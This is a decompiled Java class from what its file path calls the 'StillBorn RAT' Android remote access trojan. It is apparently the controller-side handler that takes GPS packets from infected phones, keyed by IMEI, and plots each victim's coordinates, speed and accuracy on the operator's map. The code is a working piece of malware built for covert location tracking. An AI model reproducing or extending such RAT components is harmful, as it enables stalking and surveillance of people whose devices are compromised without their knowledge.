/*  1:   */ package handler;
/*  2:   */ 
/*  3:   */ import Packet.GPSPacket;
/*  4:   */ import Packet.Packet;
/*  5:   */ import gui.GUI;
/*  6:   */ import java.util.HashMap;
/*  7:   */ import server.Server;
/*  8:   */ 
/*  9:   */ public class GPSHandler
/* 10:   */   implements PacketHandler
/* 11:   */ {
/* 12:   */   private GUI gui;
/* 13:   */   private int channel;
/* 14:   */   private String imei;
/* 15:   */   
/* 16:   */   public GPSHandler(int chan, String imei, GUI gui)
/* 17:   */   {
/* 18:36 */     this.channel = chan;
/* 19:37 */     this.imei = imei;
/* 20:38 */     this.gui = gui;
/* 21:   */   }
/* 22:   */   
/* 23:   */   public void handlePacket(Packet p, String imei, Server c)
/* 24:   */   {
/* 25:45 */     this.gui.logTxt("GPS bilgisi alındı");
/* 26:46 */     ((ChannelDistributionHandler)c.getChannelHandlerMap().get(imei)).getStorage(this.channel).reset();
/* 27:   */     
/* 28:48 */     GPSPacket gps = (GPSPacket)p;
/* 29:49 */     this.gui.updateUserMap(imei, gps.getLongitude(), gps.getLatitude(), gps.getAltitude(), gps.getSpeed(), gps.getAccuracy());
/* 30:   */   }
/* 31:   */   
/* 32:   */   public void receive(Packet p, String temp_imei) {}
/* 33:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.GPSHandler
 * JD-Core Version:    0.7.0.1
 */